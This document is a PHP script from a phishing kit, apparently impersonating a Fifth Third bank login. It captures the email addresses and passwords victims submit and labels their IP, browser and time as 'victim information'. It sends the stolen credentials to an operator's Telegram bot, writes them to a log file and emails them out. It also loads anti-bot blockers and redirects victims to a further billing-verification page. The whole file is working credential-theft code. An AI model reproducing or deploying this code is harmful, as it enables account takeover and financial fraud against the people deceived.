<?php

session_start();
error_reporting(0);

$TIME_DATE = date('H:i:s d/m/Y');
include('../assets/functions/get_browser.php');
include('../assets/functions/get_ip.php');
include('../assets/Antibot/blockers.php');
include('../assets/Antibot/detects.php');
include ('../config.php');





if (isset($_POST['email_text'])){
	$_SESSION['email_text']    = $_POST['email_text'];
	$_SESSION['email_password'] = $_POST['email_password'];
}	

$Z118_MESSAGE .= "

[ 53RD EMAIL LOGIN INFORMATION]
[ EMAIL LOGIN INFORMATION ]
[Email Address] = ".$_SESSION['email_text']."
[Email Password] = ".$_SESSION['email_password']."

[VICTIM INFORMATION ]

[TIME/DATE] = ".$TIME_DATE."
[IP INFO] = http://ip-api.com/json/".$_SESSION['_ip_']."
[REMOTE IP] = ".$_SERVER['REMOTE_ADDR']."</font><br>
[BROWSER] = ".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."
[BROWSER] = ".$_SERVER['HTTP_USER_AGENT']."

[ BY @X_hammer ]";

if (!empty($_POST['email_text'] && !empty($_POST['email_password']))){
	
	$data = [
    'text' => ''.$Z118_MESSAGE.'',
    'chat_id' => ''.$chat_id.''
	];
	file_get_contents("https://api.telegram.org/bot".$bot_token."/sendMessage?" . http_build_query($data) );
	
	
        $Z118_SUBJECT = "NEW XD ✪ ACCESS LOGIN INFO FROM : ✪ ".$_POST['email_text']." ✪";
        $Z118_HEADERS .= "From:XD <X-hammer@logs.com>";
        $Z118_HEADERS .= $_POST['email_text']."\n";
        $Z118_HEADERS .= "MIME-Version: 1.0\n";
        $Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
		
		$res_file = fopen("../53RD_LOGS/EmailAccess.txt", "a");
		fwrite($res_file, $Z118_MESSAGE);
       
        @mail($Z118_EMAIL, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
		
				
		HEADER("Location: ../verify_billing/?actionType=VerfiyInfo&ConfirmAccount=True&session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
}
	  else
	  {
		  HEADER("Location: ../verify_email/?confirm_account=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
	  }
	  
	
?>